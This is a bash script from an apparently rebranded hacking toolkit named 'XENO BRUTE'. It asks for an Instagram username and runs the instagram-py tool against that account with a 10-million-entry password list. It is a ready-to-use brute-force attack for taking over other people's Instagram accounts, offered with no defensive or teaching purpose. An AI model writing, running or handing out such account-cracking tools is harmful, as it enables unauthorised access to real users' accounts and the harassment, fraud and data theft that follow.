#!/bin/bash
# 10M Password Attack - Rebranded for XENO BRUTE
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
vlt='\033[1;35m'

SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

clear
echo -e "${vlt}
__  __   ____  _   _  ____    ____  ____  _   _ _____ _____ 
\ \/ /  | ____|| \ | |/ __ \  |  _ \|  _ \| | | |_   _| ____|
 \  /   |  _|  |  \| | |  | | | |_) | |_) | | | | | | |  _|  
 /  \   | |___ | |\  | |__| | |  _ <|  _ <| |_| | | | | |___ 
/_/\_\  |_____||_| \_|\____/  |_| \_\_| \_\\___/  |_| |_____|
               [#] 10M Password Attack [#]
${rset}"

printf "\n"
printf "       \e[101m\e[1;77m  >>  Modded By XENO MODZ  << \e[0m\n"
printf "\n"

# Check if username passed as argument (for background run)
if [ -z "$1" ]; then
    read -p "[#] Enter Instagram ID/Username : " usrnm
else
    usrnm=$1
fi

echo
inspass="$PROJECT_ROOT/passwords/pass.txt"

# Check if password list exists
if [ ! -f "$inspass" ]; then
    echo -e "${red}[!] Error: 10M password list not found at $inspass${rset}"
    echo -e "${ylo}[*] Please ensure you have a password list in the passwords/ folder.${rset}"
    exit 1
fi

echo -e "\e[1;31m Loading 10M Passwords... \e[0m"
sleep 2

# Running instagram-py
# Note: --no-browser or similar flags depend on the version of instagram-py
instagram-py --username "$usrnm" --password-list "$inspass"

echo
sleep 5
if [ -t 0 ]; then
    # Only return to menu if in interactive terminal
    cd "$PROJECT_ROOT"
    bash xeno_brute.sh
fi
